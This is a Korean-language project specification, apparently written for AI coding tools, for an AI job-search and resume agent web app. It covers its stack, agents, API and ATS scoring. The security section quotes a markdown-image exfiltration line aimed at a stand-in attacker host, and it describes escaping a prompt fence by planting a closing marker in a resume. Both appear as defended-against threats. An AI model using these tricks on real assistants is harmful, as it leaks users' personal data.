# PROJECT.md — My Offer Agent

> 이 파일은 AI 코딩 도구(Cursor, Claude Code)가 참조하는 프로젝트 기준 문서입니다.
> 모든 코드 생성 시 이 문서의 스펙을 따르세요.

## 서비스 개요

- **이름**: My Offer Agent
- **도메인**: MyOfferAgent.com
- **한줄 소개**: AI 에이전트가 이력서 작성부터 ATS 분석, 맞춤 채용공고 탐색, 지원 전략까지 취업 준비 전 과정을 함께하는 커리어 파트너
- **대상 사용자**: 미국 취업을 준비하는 대학생/주니어 개발자

## 기술 스택 (2026년 3월 기준)

| 항목 | 기술 | 버전 |
|------|------|------|
| 프레임워크 | Next.js (App Router) | 16.2.x |
| 에이전트 | @openai/agents (TypeScript) | 0.6.x |
| LLM | `MODEL_CONFIG` — 환경변수로 재정의 가능 (기본: gpt-5.5 / gpt-5.4-mini) | — |
| 스타일링 | Tailwind CSS | v4 |
| 검증 | Zod | v4 |
| 마크다운 | react-markdown | — |
| PDF 파싱 | pdfjs-dist (**로컬 번들** 동적 import) | 5.5.x |
| DOCX 생성 | docx (클라이언트, 동적 import) | 9.7.x |
| 아이콘 | lucide-react | — |
| 테스트 | vitest (순수 로직 275개) + 라이브 E2E 하니스 | 3.2.x |
| 서버 보호 | server-only (`lib/agents/tools/*`, openai-client, rate-limit) | — |
| 배포 | Cloudflare Pages (@opennextjs/cloudflare + wrangler) | — |

## 프레임워크 주의사항

### Next.js 16

- Turbopack이 기본 번들러지만, 이 프로젝트는 호환성 문제로 `next dev --webpack` 사용 중.
  (`next build`는 Turbopack으로 정상 동작)
- React Compiler 활성화 (`next.config.ts`의 `reactCompiler: true` + `babel-plugin-react-compiler`)
- `serverExternalPackages`는 제거됨 — pdfjs를 클라이언트에서만 동적 import하므로 불필요하고,
  워커 파일 번들링과 충돌합니다.
- `headers()`로 CSP 등 보안 헤더를 전 경로에 적용합니다.
- `next build`에서 linter 자동 실행 안 함

### Tailwind v4

- `tailwind.config.ts` **없음**. CSS-first 설정만 사용.
- 테마 설정은 CSS 파일에서 `@import "tailwindcss"` + `@theme { }` 디렉티브
- `bg-gradient-to-*` → `bg-linear-to-*` (v4 정식 이름)
- PostCSS: `postcss.config.mjs`에서 `@tailwindcss/postcss` 플러그인 사용

### ⚠️ 지시문 작성 시 흔한 실수

`definitions.ts`의 지시문은 **템플릿 리터럴**입니다. 마크다운 습관대로
백틱으로 코드를 감싸면 문자열이 거기서 끝나 **빌드가 깨집니다**:

```ts
() => `... Set `sponsorship` on each job ...`   // ✗ 문자열이 조기 종료됨
() => `... Set the sponsorship field ...`       // ✓
```

도구 이름·필드 이름은 그냥 평문으로 쓰세요. 모델은 백틱이 없어도 알아봅니다.
(`npm run check`의 빌드 단계가 잡아 주지만, 알고 있으면 한 번 덜 겪습니다.)

### @openai/agents SDK (TypeScript)

- 공식 문서: https://openai.github.io/openai-agents-js/
- Zod v4 필수 의존성
- 핵심 API:
  ```typescript
  import { Agent, run, handoff, webSearchTool } from '@openai/agents';
  import { z } from 'zod';
  ```
- **`new Agent<AppContext>({...})` 사용** — `Agent.create()`가 아닙니다.
  `Agent.create()`는 반환 타입의 컨텍스트를 `UnknownContext`로 고정해 버려서
  타입이 지정된 실행 컨텍스트를 쓸 수 없습니다. `Agent.create()`의 이점(핸드오프
  체인에서 `outputType` 유니온 추론)은 모든 에이전트가 텍스트 출력인 이 프로젝트에
  해당되지 않습니다.
- **실행 컨텍스트**: `run(agent, input, { context })` → 도구는 `execute(input, runContext)`의
  두 번째 인자로 받고, `runContext.context`가 우리 객체입니다 (`lib/agents/context.ts`).
  이력서 정본이 여기 있으며, **모델에게 전송되지 않습니다.**
- **동적 지시문**: `instructions`는 함수를 받습니다 —
  `(runContext, agent) => string`. 로케일·이력서 상태에 따라 지시문을 생성합니다.
- **스트리밍**: `run(agent, input, { stream: true })` → `StreamedRunResult`.
  `for await (const e of streamed)`로 순회하며 이벤트 타입은 3종:
  - `agent_updated_stream_event` — 핸드오프 실시간 감지 (`e.agent.name`)
  - `run_item_stream_event` — `e.name`이 `tool_called` / `tool_output` 등
  - `raw_model_stream_event` — `e.data.type === 'output_text_delta'`면 `e.data.delta`가 텍스트 조각
  순회 후 `await streamed.completed`, 그리고 `streamed.currentAgent` / `streamed.lastResponseId` 사용.
- **대화 체인**: `streamed.lastResponseId` → 다음 턴에서 `previousResponseId`로 전달
- hosted tool: `webSearchTool()` (import 후 배열에 추가)
- function tool: `tool()` 헬퍼 + Zod 스키마. 도구 파라미터는 `.optional()` 대신
  `.default()`를 쓰세요 (strict JSON Schema 변환 때문).

## 폴더 구조

```
~/Desktop/myofferagent-com/
├── src/
│   ├── app/
│   │   ├── layout.tsx              ← 루트 레이아웃 (다국어/테마 Provider)
│   │   ├── page.tsx                ← 랜딩 페이지
│   │   ├── globals.css             ← Tailwind v4 테마 + CSS 변수
│   │   ├── error.tsx               ← 전역 에러 바운더리
│   │   ├── agent/
│   │   │   ├── page.tsx            ← 에이전트 채팅 화면
│   │   │   ├── loading.tsx         ← 로딩 스켈레톤
│   │   │   └── error.tsx           ← 채팅 에러 바운더리
│   │   └── api/
│   │       └── agent/
│   │           └── route.ts        ← [백엔드] 에이전트 API (SSE 스트리밍)
│   ├── lib/
│   │   ├── types.ts                ← API 요청/응답 + SSE 이벤트 유니온 (프론트·백 공유)
│   │   ├── agent-client.ts         ← SSE 클라이언트 (fetch + 수동 파싱; EventSource는 POST 불가)
│   │   ├── rate-limit.ts           ← ⚠️ server-only — Cloudflare 레이트리미터 바인딩 + 폴백
│   │   ├── i18n.ts                 ← 다국어 번역 키 (ko/en)
│   │   ├── i18n-context.tsx        ← 다국어 React Context
│   │   ├── theme-context.tsx       ← 다크/라이트 테마 Context
│   │   ├── url-utils.ts            ← isSafeUrl() 공유 유틸 (XSS 방지)
│   │   ├── resume/                 ← ★ 이력서 도메인 (정본 · 렌더링 · 채점)
│   │   │   ├── schema.ts           ← Zod ResumeDocument 정본 + merge/upsert/completeness
│   │   │   ├── ats.ts              ← 규칙 기반 채점 65점 (LLM은 키워드·문법 35점만)
│   │   │   ├── store.ts            ← useSyncExternalStore 외부 저장소 + localStorage
│   │   │   ├── use-resume.ts       ← 이력서 훅 (store의 얇은 래퍼)
│   │   │   ├── export.ts           ← PDF(iframe 인쇄)/DOCX/MD/JSON 내보내기 — 클라이언트 전용
│   │   │   └── render/
│   │   │       ├── shared.ts       ← 섹션 순서·날짜·연락처 공용 규칙
│   │   │       ├── markdown.ts     ← doc → 마크다운 / 평문 (순수 함수, LLM 없음)
│   │   │       ├── print-html.ts   ← doc → ATS 안전 인쇄용 HTML
│   │   │       └── docx.ts         ← doc → .docx Blob (동적 import)
│   │   └── agents/
│   │       ├── constants.ts        ← ⚠️ AGENT_NAMES 상수 (client-safe)
│   │       ├── intent.ts           ← 의도 감지 순수 함수 (테스트 가능; 에이전트 그래프 미참조)
│   │       ├── routing.ts          ← 의도 → 시작 에이전트 결정
│   │       ├── context.ts          ← AppContext (이력서 정본 + locale + emitted)
│   │       ├── definitions.ts      ← 6개 에이전트 (bottom-up, 동적 instructions)
│   │       ├── openai-client.ts    ← ⚠️ server-only — 재시도·타임아웃·파라미터 자가복구
│   │       ├── model-config.ts     ← MODEL_CONFIG (환경변수 재정의 가능)
│   │       ├── index.ts            ← re-export + getAgentByName
│   │       └── tools/
│   │           ├── resume-tools.ts   ← ⚠️ server-only — 이력서 부분 패치 도구 8개
│   │           └── analysis-tools.ts ← ⚠️ server-only — import/ATS/jobs/match 리포트
│   └── components/
│       ├── pdf-loader.ts           ← pdfjs-dist 동적 로드
│       ├── chat/
│       │   ├── ChatInterface.tsx    ← 메인 채팅 UI (SSE 소비, 이력서 패널 통합)
│       │   ├── MessageBubble.tsx    ← react-markdown 렌더링 + 스트리밍 커서
│       │   └── AgentStatusPanel.tsx ← 사이드바 에이전트 상태 표시
│       ├── resume/
│       │   ├── ResumePanel.tsx      ← ★ 실시간 이력서 편집 패널 + 내보내기
│       │   ├── EditableText.tsx     ← 인라인 편집 입력 (항상 input, 모드 전환 없음)
│       │   └── ATSScoreCard.tsx     ← ATS 분석 결과 시각화
│       ├── jobs/
│       │   └── JobCard.tsx          ← 채용공고 카드 (report_jobs 도구가 데이터 공급)
│       └── ui/
│           └── Toast.tsx            ← 토스트 알림
├── public/
├── .env.local                      ← OPENAI_API_KEY
├── next.config.ts
├── tsconfig.json
├── eslint.config.mjs
├── postcss.config.mjs
├── wrangler.toml                   ← Cloudflare Pages 배포 설정
├── open-next.config.ts             ← OpenNext 어댑터 설정
├── LICENSE                         ← MIT 라이선스
└── PROJECT.md                      ← 이 파일
```

## ⚠️ 아키텍처 핵심 규칙 (반드시 준수)

### 1. server-only 순환 참조 방지

- `lib/agents/tools/*`, `openai-client.ts`, `lib/rate-limit.ts` 첫 줄에 `import 'server-only'`
- `index.ts`는 이들을 transitively import → **client 컴포넌트에서 import 금지**
- **client 컴포넌트**에서 에이전트 이름이 필요하면 → `@/lib/agents/constants`
- **테스트 가능한 순수 로직**은 별도 파일로 분리 (`intent.ts`가 그 예) —
  `server-only`를 끌어오는 모듈에 섞으면 vitest에서 import할 수 없습니다.

### 2. 이력서 상태는 컨텍스트에 산다 (가장 중요)

이력서 정본(`ResumeDocument`)은 **서버 실행 컨텍스트**에 있고, 도구는 **부분 패치**만 합니다.

```
클라이언트(localStorage) --resumeDoc--> route.ts --context--> 도구가 패치
                        <--resumeDoc--            <--ctx.resume
```

- 서버는 무상태 → Cloudflare Workers에 그대로 배포 (DB 불필요)
- 사용자가 편집 패널에서 고친 내용이 다음 턴에 에이전트에게 그대로 전달됨
- **LLM이 이력서 전체를 재직렬화하지 않습니다.** 바뀐 필드만 말하면 코드가 나머지를 보존합니다.

> 과거 설계: Builder가 `generate_resume_markdown({ resumeJson: "<전체 JSON 문자열>" })`을
> 호출해야 했습니다. LLM이 매번 기억에서 이력서 전체를 다시 써야 했고, 한 필드라도
> 빠뜨리면 그대로 유실됐습니다. 파라미터 타입이 `string`이라 Zod 검증도 우회됐습니다.

### 3. 렌더링은 결정론적 코드, LLM은 내용만

- `lib/resume/render/*`는 **순수 함수**입니다. LLM을 호출하지 않습니다.
- LLM은 *내용을 좋게 만드는* 일만 합니다 (`improve_bullets`).
- ATS 채점도 같은 원칙: 셀 수 있는 것(포맷·구조·성과·가독성 65점)은 코드가,
  판단이 필요한 것(키워드·문법 35점)만 LLM이 맡습니다. → 점수가 재현 가능합니다.

### 4. 라우팅은 **첫 턴에만** 개입한다

`lib/agents/routing.ts`는 대화가 시작될 때만 에이전트를 고릅니다.
**대화 도중에는 절대 강제 전환하지 않습니다.** 전환은 전부 handoff가 담당합니다.

이유 1 — 정규식 오탐의 대가가 너무 큽니다. 실측:
```
"제 프로젝트는 채용공고 크롤러입니다"  → search 로 오판
"I built a job search platform"        → search 로 오판
```
취업 준비생의 대표적인 포트폴리오가 채용 사이트입니다. 이력서를 쓰던 학생이
자기 프로젝트를 설명하는 순간 Job Scout으로 끌려가고, 돌아올 길이 없었습니다.

이유 2 — `previousResponseId`로 이어지는 대화에서 에이전트를 갈아타면
이전 에이전트의 **도구 호출 기록**을 새 에이전트가 읽게 됩니다. 모델이 그 도구를
다시 호출하면 SDK가 `Tool ... not found in agent` → `ModelBehaviorError`로
런 전체를 중단시킵니다 (`runner/modelOutputs.mjs`에서 확인).
SDK의 해법인 `handoff({ inputFilter })`는 로컬 상태만 고칠 수 있어
서버에 저장된 기록에는 손대지 못합니다.

그래서 `definitions.ts` 하단에서 **역방향 handoff 경로**를 모두 열어 둡니다
(Scout→Analyzer/Builder, Match→Scout, Writer→Scout/Match, Analyzer→Builder).
순환은 문제되지 않습니다 — `maxTurns`가 상한을 겁니다.

## 에이전트 아키텍처

### 플로우

```
사용자 → [route.ts 서버사이드 라우팅] → 적절한 에이전트
            │
            ├── 검색 의도 → jobScoutAgent (web_search)
            │                    ↓ (서버사이드 라우팅, 사용자가 공고 선택 시)
            │               matchStrategyAgent
            │                    ↓ (LLM handoff)
            │               applicationWriterAgent
            │
            ├── 이력서 있음/분석 → resumeAnalyzerAgent
            │                         ↓ (LLM handoff)
            │                     jobScoutAgent
            │
            ├── 이력서 없음/작성 → resumeBuilderAgent
            │                         ↓ (LLM handoff)
            │                     resumeAnalyzerAgent
            │
            └── 의도 불분명 → triageAgent (LLM 라우팅)
                               ├── transfer_to_resume_builder
                               ├── transfer_to_resume_analyzer
                               └── transfer_to_job_scout
```

### 에이전트별 스펙

모든 에이전트는 `MODEL_CONFIG.standard`를 사용합니다.

| # | 에이전트 | 역할 | 도구 | handoff 대상 |
|---|---------|------|------|-------------|
| 0 | triageAgent | 의도 파악 후 라우팅 | 없음 | builder, analyzer, scout |
| 1 | resumeBuilderAgent | 대화형 이력서 작성 | `RESUME_BUILDER_TOOLS` (패치 8개) | analyzer |
| 2 | resumeAnalyzerAgent | ATS 100점 분석 | get_resume, import_resume_text, analyze_ats | scout |
| 3 | jobScoutAgent | 채용공고 웹 검색 | webSearchTool(), **report_jobs** | match |
| 4 | matchStrategyAgent | 이력서-JD 매칭 분석 | get_resume, **report_match** | writer |
| 5 | applicationWriterAgent | 커버레터 작성 | get_resume | 없음 |

**`report_jobs` / `report_match`가 핵심입니다.** 이 도구들이 `ctx.emitted`를 채워야
`JobCard`와 `MatchResultCard`가 렌더링됩니다. 예전에는 route.ts가 도구 출력 문자열을
`output.includes('"overallScore"')` 같은 방식으로 훑어 구조화 데이터를 *추측*했고,
그 결과 `job_results`·`match_analysis`는 **한 번도 생성되지 않아** 두 컴포넌트가
도달 불가능한 죽은 코드였습니다.

### definitions.ts 정의 순서 (bottom-up, 순환참조 방지)

1. applicationWriterAgent
2. matchStrategyAgent
3. jobScoutAgent
4. resumeAnalyzerAgent
5. resumeBuilderAgent
6. triageAgent

### model-config.ts

```typescript
export const MODEL_CONFIG = {
  fast: envModel('OPENAI_MODEL_FAST', 'gpt-5.4-mini'),      // 파싱, 불릿 개선
  standard: envModel('OPENAI_MODEL_STANDARD', 'gpt-5.5'),   // 에이전트 추론, 분석, 매칭
} as const;
```

기본값은 `/v1/models`에 존재함을 확인했지만, 개발 당시 API 키에 크레딧이 없어
**실제 추론 호출은 검증하지 못했습니다.** `npm run check:models`로 확인하세요.
대안 목록은 `KNOWN_MODELS`에 있습니다.

## API 스펙

### POST /api/agent

**응답은 SSE 스트림입니다** (`text/event-stream`). 성공·실패 모두 같은 형식이라
클라이언트 처리 경로가 하나로 유지됩니다.

Request:
```typescript
interface AgentRequest {
  messages: Array<{ role: 'user' | 'assistant'; content: string }>;
  sessionId: string;
  resumeText?: string;        // 프론트에서 PDF 텍스트 추출 후 전달
  resumeDoc?: ResumeDocument; // 클라이언트가 보관 중인 이력서 정본 (매 턴 왕복)
  lastResponseId?: string;    // 이전 턴의 OpenAI response ID (대화 체인용)
  activeAgentName?: string;   // 현재 활성 에이전트 이름 (다음 턴 시작점)
  language?: 'ko' | 'en';    // 응답 언어 설정
}
```

Response — `data: <JSON>\n\n` 프레임의 연속:
```typescript
type AgentStreamEvent =
  | { type: 'agent'; name: string }            // 활성 에이전트 변경 (handoff 포함)
  | { type: 'tool_start'; tool: string }       // 도구 실행 시작 (진행 표시용)
  | { type: 'tool_end'; tool: string }
  | { type: 'delta'; text: string }            // 응답 텍스트 조각
  | { type: 'done'; payload: AgentResponse }   // 최종 페이로드
  | { type: 'error'; message: string };

interface AgentResponse {
  output: string;
  activeAgent: string;
  structuredData: StructuredData;
  resumeDoc?: ResumeDocument;  // 이번 턴에 이력서가 바뀐 경우에만
  lastResponseId?: string;
  error?: string;
}
```

클라이언트는 `lib/agent-client.ts`의 `streamAgent()`로 소비합니다
(`EventSource`는 GET만 지원해서 직접 파싱합니다).

### 요청 제한

- `MAX_MESSAGES = 50`, `MAX_MESSAGE_CHARS = 12_000`, `MAX_RESUME_TEXT = 60_000`
- `MAX_BODY_SIZE = 1_000_000` — **실제 읽은 바이트로 판정**합니다.
  `content-length` 헤더만 보면 `Transfer-Encoding: chunked`일 때 헤더가 없어
  `Number(null ?? 0)` → 0 → 검사를 그냥 통과했습니다.
- `MAX_TURNS = 20` — 에이전트 루프 상한 (역방향 handoff가 생겨 상향)
- **Rate Limiting**: Cloudflare `RATE_LIMITER` 바인딩 (60초 / 20회).
  바인딩이 없으면 인메모리로 강등되며, Workers에서는 isolate별이라 신뢰할 수 없습니다.

### 핵심 타입

```typescript
interface ATSAnalysis {
  overallScore: number;  // 0-100
  sections: {
    formatCompatibility: { score: number; maxScore: 20; issues: string[]; suggestions: string[] };
    keywordOptimization: { score: number; maxScore: 25; matched: string[]; missing: string[] };
    achievementQuality: { score: number; maxScore: 20; weakBullets: string[]; improved: string[] };
    structuralCompleteness: { score: number; maxScore: 15; present: string[]; missing: string[] };
    readability: { score: number; maxScore: 10; issues: string[] };
    grammar: { score: number; maxScore: 10; errors: string[] };
  };
  topStrengths: string[];
  criticalImprovements: string[];
}

interface MatchAnalysis {
  matchScore: number;  // 0-100
  keywordGap: { matched: string[]; missing: string[] };
  skillMatch: {
    required: { met: string[]; unmet: string[]; percentage: number };
    preferred: { met: string[]; unmet: string[]; percentage: number };
  };
  resumeEdits: Array<{ section: string; original: string; suggested: string; reason: string }>;
}

interface JobSearchResult {
  company: string;
  position: string;
  location: string;
  type: 'remote' | 'onsite' | 'hybrid';
  url: string;
  requirements: string[];
  estimatedMatch: number;
}

// 이력서 정본 — lib/resume/schema.ts의 Zod 스키마에서 파생됩니다.
// (예전의 느슨한 ParsedResume를 대체)
interface ResumeDocument {
  basics: { name; email; phone; location; linkedin; github; website; summary };  // 전부 string
  education: Array<{ id; school; degree; major; gpa; location; startDate; endDate; highlights }>;
  experience: Array<{ id; company; title; location; startDate; endDate; current; bullets }>;
  projects: Array<{ id; name; role; url; tech; startDate; endDate; bullets }>;
  skills: { languages: string[]; frameworks: string[]; tools: string[]; other: string[] };
  targetRole: string;
  version: 1;
}
```

**모든 필드에 기본값이 있어 부분 이력서도 항상 유효합니다** — 작성 중 어느 시점에
저장·렌더링해도 깨지지 않습니다. 리스트 항목에 `id`가 있어 특정 항목만 수정할 수 있습니다.
`coerceResume(unknown)`은 절대 throw하지 않고, 실패 시 빈 이력서를 반환합니다.

## 디자인 시스템

- **모드**: 다크 기본 (`<html class="dark">`), 라이트 전환 가능
- **액센트**: 에메랄드 (#10B981 / oklch(0.765 0.177 163.22))
- **배경**: slate-950 계열
- **폰트**: Geist Sans (본문), Geist Mono (코드)
- **아이콘**: lucide-react
- **애니메이션**: Tailwind transition/animate만 (framer-motion X)
- **감성**: 미니멀 AI SaaS, 전문적이면서 깔끔
- **다국어**: ko (기본), en 지원 — src/lib/i18n.ts

## 작업 경계

| 영역 | 담당 |
|------|------|
| 프론트엔드 + 백엔드 전체 | Claude Code |

## ATS 채점 설계 (제품의 핵심 숫자)

`lib/resume/ats.ts`의 65점은 **결정론적 규칙**입니다. 다음 원칙을 지키세요:

- **동사 판정은 허용 목록이 아니라 형태론.** 예전에 63개짜리 목록을 썼다가
  Wrote·Owned·Mentored·Containerized·Benchmarked를 전부 감점했고, 잘 쓴
  이력서의 **최고 불릿들이 "약한 불릿"으로 사용자에게 표시**됐습니다.
  → `isStrongVerb()`: 약한 동사 차단 + 불규칙 과거형 + `-ed` 규칙.
- **수치 판정은 단위를 포함.** `\d{2,}`는 `240ms`·`500GB`를 놓치고
  연도(`2025`)·버전(`Java 17`)은 성과로 잘못 셌습니다.
  → `hasQuantity()`: 성과 아닌 숫자를 먼저 제거한 뒤 단위·대상 패턴을 인정.
- **학력 highlights는 성과 불릿이 아닙니다.** 수강 과목은 동사로 시작할 이유가
  없는데 예전에는 함께 채점해 모든 신입을 이중 감점했습니다.
- **테스트는 절대값으로.** 상대 비교("정량적 > 모호함")만 하면 채점기가 좋은
  이력서에 9.8/20을 주는 동안에도 전부 통과합니다. 실제 점수를 못박으세요.

## 보안

- **CSP** (`next.config.ts`) — `img-src`가 핵심입니다. 프롬프트 인젝션에 성공해도
  `![](https://공격자/?d=<PII>)` 무클릭 유출이 막힙니다. 1차 방어는 `MessageBubble`이
  마크다운 이미지를 아예 렌더링하지 않는 것입니다.
- **프롬프트 울타리** (`lib/agents/sanitize.ts`) — 신뢰할 수 없는 텍스트는
  `fence()`로 감쌉니다. 데이터 안의 닫는 마커를 **먼저 제거**합니다.
  (제거하지 않으면 이력서에 마커 한 줄만 넣어 울타리를 빠져나갈 수 있었습니다.)
- **시스템 프롬프트에 사용자 값을 넣지 않습니다** — `resumeState()`는 값이 아니라
  유무(`set`/`MISSING`)만 노출합니다. 실제 값이 필요하면 모델이 `get_resume`을
  호출하고, 그 결과는 시스템 프롬프트가 아닌 도구 출력 위치로 들어갑니다.
- **pdfjs는 로컬 번들** — CDN ESM import에는 SRI를 걸 수 없어, CDN이 오염되면
  우리 오리진에서 임의 코드가 실행되고 localStorage의 이력서를 읽을 수 있었습니다.
- 인쇄용 iframe은 `sandbox="allow-same-origin allow-modals"` — 스크립트 실행 차단.

## 검증 방법

```bash
npm run check          # typecheck + test + build
npm run test           # vitest (순수 로직 82개)
npm run check:models   # 설정된 모델이 실제로 호출되는지 확인
```

테스트는 **순수 로직만** 다룹니다 — 스키마/병합, 렌더러(MD·HTML·평문),
ATS 규칙 채점, 의도 감지. LLM 호출이 필요한 경로는 테스트하지 않습니다.

## 완성 상태 (2026년 7월 기준)

### 완성됨
- **이력서 정본 파이프라인**: Zod 스키마 → 부분 패치 도구 → 결정론적 렌더 → PDF/DOCX/MD/JSON
- **실시간 편집 패널**: 필드 직접 수정, 완성도 게이지, 편집분이 다음 턴에 에이전트로 전달
- **SSE 스트리밍**: 텍스트 델타 + 도구 진행 상황 + 실시간 handoff 표시 + 중지 버튼
- 하이브리드 ATS 채점 (규칙 65 / LLM 35) — 같은 이력서는 항상 같은 점수
- 구조화 출력으로 JobCard·MatchResultCard 렌더링
- 로케일별 동적 instructions (사용자 입력에 언어 지시문을 끼워 넣던 방식 제거)
- localStorage 이력서 영속화 (`useSyncExternalStore`) — 새로고침해도 유지
- 프롬프트 인젝션 방어 (사용자 데이터 구분자 + 지시문의 데이터 취급 규칙)
- 채팅 기본 플로우, PDF 첨부, 채용공고 검색, 다국어, 테마, 모바일 최적화
- ARIA 접근성, XSS 방지, 요청 제한
- Cloudflare 배포 설정 + 네이티브 레이트리미터 바인딩
- MIT LICENSE

### 미검증 (⚠️ 크레딧 복구 후 확인 필요)
개발 당시 `OPENAI_API_KEY`가 `insufficient_quota` 상태여서 **LLM이 실제로 도는
경로는 런타임 검증하지 못했습니다.** 코드 경로는 SSE 프레임까지 확인했습니다
(라우팅 → 컨텍스트 생성 → 스트림 오픈 → 이벤트 방출 → 오류 처리).

- [ ] `npm run check:models` — 모델명이 실제 호출되는지, `temperature`를 거부하는지
      (거부 시 `openai-client.ts`가 파라미터를 빼고 자동 재시도하도록 되어 있음)
- [ ] `webSearchTool()`이 gpt-5.x 계열에서 동작하는지
- [ ] 6개 에이전트 end-to-end 체인
- [ ] 브라우저 인쇄 PDF의 실제 여백·머리말 (Chrome/Safari/Firefox)
- [ ] Workers 배포 후 `RATE_LIMITER` 바인딩 동작
